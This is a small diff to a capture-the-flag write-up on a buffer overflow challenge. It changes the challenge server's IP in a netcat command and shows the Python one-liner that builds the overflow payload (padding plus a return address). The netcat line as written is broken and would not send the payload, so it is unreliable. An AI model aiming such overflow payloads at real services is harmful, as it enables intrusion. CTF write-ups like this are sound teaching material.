@@ -35,5 +35,5 @@ The challenge name suggests that they should attempt a Buffer Overflow exploit.
    root@mctf:~$ python -c "print 'A' * 71 + '\x92\x11\x40'" > payload
    ```
    ```console
-   root@mctf:~$ echo payload > nc 159.89.194.7 1342
+   root@mctf:~$ echo payload > nc 128.199.77.173 1342
    ```
